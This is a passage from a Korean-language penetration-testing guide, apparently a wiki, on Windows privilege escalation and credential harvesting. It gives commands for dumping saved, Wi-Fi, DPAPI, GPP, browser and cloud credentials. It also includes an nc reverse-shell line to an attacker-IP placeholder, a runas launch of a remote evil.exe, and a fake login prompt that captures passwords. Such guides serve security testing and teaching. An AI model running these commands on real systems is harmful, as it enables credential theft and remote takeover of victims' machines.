net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts 파일에 하드코딩된 다른 알려진 컴퓨터를 확인하세요.
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **제한된 서비스**를 확인하십시오.
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령어는 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 목록, 규칙 생성, 끄기, 끄기...)**

더 많은 [네트워크 열거 명령어는 여기](../basic-cmd-for-pentesters.md#network) 있습니다.

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
이진 파일 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

루트 사용자 권한을 얻으면 어떤 포트에서도 수신할 수 있습니다(처음 `nc.exe`를 사용하여 포트에서 수신할 때 GUI를 통해 `nc`가 방화벽에 의해 허용되어야 하는지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash를 루트로 쉽게 시작하려면 `--default-user root`를 시도할 수 있습니다.

`WSL` 파일 시스템은 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 폴더에서 탐색할 수 있습니다.

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 자격 증명 관리자 / Windows 금고

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows 금고는 **Windows**가 **사용자를 자동으로 로그인**할 수 있는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장합니다. 처음에는 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장하여 브라우저를 통해 자동으로 로그인할 수 있는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows 금고는 Windows가 사용자를 자동으로 로그인할 수 있는 자격 증명을 저장합니다. 이는 **자원에 접근하기 위해 자격 증명이 필요한 모든 Windows 애플리케이션**이 **이 자격 증명 관리자** 및 Windows 금고를 사용하여 사용자가 항상 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있음을 의미합니다.

애플리케이션이 자격 증명 관리자와 상호 작용하지 않는 한, 특정 자원에 대한 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션이 금고를 사용하려면 어떤 식으로든 **자격 증명 관리자와 통신하여 기본 저장 금고에서 해당 자원에 대한 자격 증명을 요청해야 합니다.**

`cmdkey`를 사용하여 머신에 저장된 자격 증명을 나열합니다.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 `/savecred` 옵션과 함께 `runas`를 사용하여 저장된 자격 증명을 사용할 수 있습니다. 다음 예제는 SMB 공유를 통해 원격 바이너리를 호출하는 것입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`와 제공된 자격 증명을 사용합니다.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)를 참고하세요.

### DPAPI

**데이터 보호 API (DPAPI)**는 데이터의 대칭 암호화를 위한 방법을 제공하며, 주로 Windows 운영 체제 내에서 비대칭 개인 키의 대칭 암호화에 사용됩니다. 이 암호화는 사용자 또는 시스템 비밀을 활용하여 엔트로피에 크게 기여합니다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키의 암호화를 가능하게 합니다**. 시스템 암호화가 포함된 시나리오에서는 시스템의 도메인 인증 비밀을 사용합니다.

DPAPI를 사용하여 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉토리에 저장되며, 여기서 `{SID}`는 사용자의 [보안 식별자](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **DPAPI 키는 사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 위치하며**, 일반적으로 64바이트의 임의 데이터로 구성됩니다. (이 디렉토리에 대한 접근은 제한되어 있어 CMD의 `dir` 명령어로 내용을 나열할 수 없지만, PowerShell을 통해 나열할 수 있습니다).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz 모듈** `dpapi::masterkey`를 적절한 인수(`/pvk` 또는 `/rpc`)와 함께 사용하여 이를 복호화할 수 있습니다.

**마스터 비밀번호로 보호된 자격 증명 파일**은 일반적으로 다음 위치에 있습니다:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 **스크립팅** 및 자동화 작업을 위해 암호화된 자격 증명을 편리하게 저장하는 방법으로 자주 사용됩니다. 자격 증명은 **DPAPI**를 사용하여 보호되며, 이는 일반적으로 동일한 컴퓨터에서 동일한 사용자에 의해서만 복호화될 수 있음을 의미합니다.

PS 자격 증명을 포함하는 파일에서 **복호화**하려면 다음과 같이 할 수 있습니다:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
와 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`에서 찾을 수 있습니다.

### 최근 실행된 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz** `dpapi::rdg` 모듈을 사용하여 적절한 `/masterkey`로 **모든 .rdg 파일을 복호화**합니다.\
Mimikatz `sekurlsa::dpapi` 모듈을 사용하여 메모리에서 **많은 DPAPI 마스터키를 추출**할 수 있습니다.

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 **비밀번호** 및 기타 정보를 저장하지만, 이것이 데이터베이스 파일이라는 것을 인식하지 못합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며, 항상 검색하고 검토할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 비밀번호를 복구하려면 관리자여야 하며 높은 무결성 수준에서 실행해야 합니다.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉토리에 위치합니다.\
이 파일이 존재하면 일부 **자격 증명**이 구성되었을 가능성이 있으며 **복구**할 수 있습니다.

이 코드는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하십시오.\
설치 프로그램은 **SYSTEM 권한으로 실행되며**, 많은 프로그램이 **DLL Sideloading에 취약합니다 (정보 출처: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (자격 증명)

### Putty 자격 증명
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH 키를 레지스트리에 저장하기

SSH 개인 키는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys`에 저장될 수 있으므로, 그 안에 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로 내에서 항목을 찾으면 아마도 저장된 SSH 키일 것입니다. 이는 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하여 쉽게 복호화할 수 있습니다.\
이 기술에 대한 더 많은 정보는 여기에서 확인할 수 있습니다: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` 서비스가 실행되고 있지 않다면 부팅 시 자동으로 시작되도록 하려면 다음을 실행하십시오:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> 이 기술은 더 이상 유효하지 않은 것 같습니다. 나는 몇 개의 ssh 키를 생성하고 `ssh-add`로 추가한 후 ssh를 통해 머신에 로그인하려고 했습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않으며 procmon은 비대칭 키 인증 중 `dpapi.dll`의 사용을 식별하지 못했습니다.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
이 파일들은 **metasploit**를 사용하여 검색할 수도 있습니다: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**라는 파일을 검색하세요.

### Cached GPP Pasword

이전에는 Group Policy Preferences (GPP)를 통해 여러 머신에 사용자 정의 로컬 관리자 계정을 배포할 수 있는 기능이 제공되었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPO)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용하여 AES256으로 암호화된 이 GPP 내의 비밀번호는 인증된 사용자가 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 할 수 있는 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함하는 로컬 캐시 GPP 파일을 스캔하는 기능이 개발되었습니다. 이러한 파일을 찾으면, 이 기능은 비밀번호를 복호화하고 사용자 정의 PowerShell 객체를 반환합니다. 이 객체에는 GPP에 대한 세부정보와 파일의 위치가 포함되어 있어 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.

다음 파일을 위해 `C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_에서 검색하세요:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호 가져오기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
웹.config의 자격 증명 예:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명이 포함된 가능한 파일 이름**

일부 이전에 **평문** 또는 **Base64**로 **비밀번호**를 포함하고 있었던 알려진 파일
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
제안된 모든 파일을 검색하십시오:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 자격 증명

자격 증명이 있는지 확인하기 위해 Bin을 확인해야 합니다.

여러 프로그램에 의해 저장된 **비밀번호를 복구**하려면: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html) 를 사용할 수 있습니다.

### 레지스트리 내부

**자격 증명이 있는 다른 가능한 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**레지스트리에서 openssh 키 추출.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

**Chrome 또는 Firefox**에서 비밀번호가 저장된 db를 확인해야 합니다.\
또한 브라우저의 기록, 북마크 및 즐겨찾기를 확인하여 **비밀번호가** 저장되어 있을 수 있습니다.

브라우저에서 비밀번호를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 덮어쓰기**

**컴포넌트 오브젝트 모델 (COM)**은 서로 다른 언어의 소프트웨어 구성 요소 간의 **상호 통신**을 허용하는 Windows 운영 체제 내에 구축된 기술입니다. 각 COM 구성 요소는 **클래스 ID (CLSID)**를 통해 **식별**되며, 각 구성 요소는 하나 이상의 인터페이스를 통해 기능을 노출하며, 이는 인터페이스 ID (IIDs)를 통해 식별됩니다.

COM 클래스와 인터페이스는 각각 **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** 및 **HKEY\_**_**CLASSES\_**_**ROOT\Interface** 레지스트리에 정의됩니다. 이 레지스트리는 **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT**를 병합하여 생성됩니다.

이 레지스트리의 CLSID 내부에는 **InProcServer32**라는 자식 레지스트리가 있으며, 여기에는 **DLL**을 가리키는 **기본값**과 **Apartment** (단일 스레드), **Free** (다중 스레드), **Both** (단일 또는 다중) 또는 **Neutral** (스레드 중립)일 수 있는 **ThreadingModel**이라는 값이 포함되어 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 DLL을 **덮어쓸 수 있다면**, 해당 DLL이 다른 사용자에 의해 실행될 경우 **권한 상승**을 할 수 있습니다.

공격자가 COM 하이재킹을 지속성 메커니즘으로 사용하는 방법을 배우려면 확인하세요:

{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서 일반 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **는 msf** 플러그인으로, 이 플러그인은 **희생자의 내부에서 자격 증명을 검색하는 모든 metasploit POST 모듈을 자동으로 실행**하도록 만들어졌습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에 언급된 비밀번호가 포함된 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구입니다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 **세션**, **사용자 이름** 및 **비밀번호**를 검색하며, 이 데이터가 일반 텍스트로 저장되는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP)의 정보를 찾습니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 즉 **파이프**는 프로세스 간 통신 및 데이터 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하여 관련 없는 프로세스가 서로 다른 네트워크를 통해서도 데이터를 공유할 수 있게 합니다. 이는 **named pipe server**와 **named pipe client**로 정의된 역할을 가진 클라이언트/서버 아키텍처와 유사합니다.

**클라이언트**가 파이를 통해 데이터를 전송할 때, 파이를 설정한 **서버**는 필요한 **SeImpersonate** 권한이 있는 경우 **클라이언트의 신원을 취할 수 있는** 능력을 가집니다. 파이를 통해 통신하는 **특권 프로세스**를 식별하고 그 신원을 모방할 수 있는 기회를 제공하여, 해당 프로세스가 설정한 파이와 상호작용할 때 더 높은 권한을 **얻을 수 있습니다**. 이러한 공격을 실행하는 방법에 대한 지침은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 찾을 수 있습니다.

또한 다음 도구는 **burp와 같은 도구로 named pipe 통신을 가로챌 수 있게 해줍니다:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 도구는 모든 파이프를 나열하고 볼 수 있게 해주어 privescs를 찾는 데 도움을 줍니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

사용자로서 쉘을 얻을 때, **명령줄에 자격 증명을 전달하는** 예약된 작업이나 다른 프로세스가 실행될 수 있습니다. 아래 스크립트는 프로세스 명령줄을 2초마다 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력합니다.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 훔치기

